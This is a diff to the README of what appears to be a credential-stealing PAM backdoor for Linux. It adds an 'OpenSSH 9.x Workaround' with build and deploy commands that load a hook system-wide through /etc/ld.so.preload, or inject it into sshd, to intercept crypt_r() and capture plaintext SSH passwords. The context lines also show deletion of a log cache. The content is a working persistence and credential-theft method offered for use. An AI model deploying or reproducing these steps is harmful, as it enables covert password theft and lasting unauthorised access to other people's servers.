@@ -114,12 +114,30 @@ rm /var/cache/ldconfig/aux-cache.log
 
 | OS | PAM Path | Auth | Cred Log |
 |----|----------|------|----------|
-| Photon OS 1.0 | `/usr/lib/security/` | Yes | Yes |
-| Debian 12 | `/lib/x86_64-linux-gnu/security/` | Yes | No* |
+| Photon OS 1.0 | `/usr/lib/security/` | Yes | Yes (PAM) |
+| Debian 12 | `/lib/x86_64-linux-gnu/security/` | Yes | Yes (Hook)* |
 | RHEL/CentOS | `/lib64/security/` | - | - |
 | Generic Linux | `/lib/security/` | - | - |
 
-*OpenSSH 9.x scrubs passwords before returning them to PAM modules. Credential logging only works on OpenSSH < 9.0.
+*OpenSSH 9.x scrubs passwords before returning them to PAM modules. Use `pam_hook.so` (LD_PRELOAD) for credential capture.
+
+## OpenSSH 9.x Workaround
+
+For systems with OpenSSH 9.x, use the LD_PRELOAD hook instead of the PAM module for credential capture:
+
+```bash
+# Compile
+gcc -fPIC -shared -o pam_hook.so pam_hook.c -ldl
+
+# Deploy (system-wide)
+cp pam_hook.so /lib/
+echo "/lib/pam_hook.so" > /etc/ld.so.preload
+
+# Or per-process
+LD_PRELOAD=/path/to/pam_hook.so /usr/sbin/sshd -D
+```
+
+The hook intercepts `crypt_r()` where the plaintext password is verified, bypassing OpenSSH's PAM scrubbing.
 
 ## Legal
 
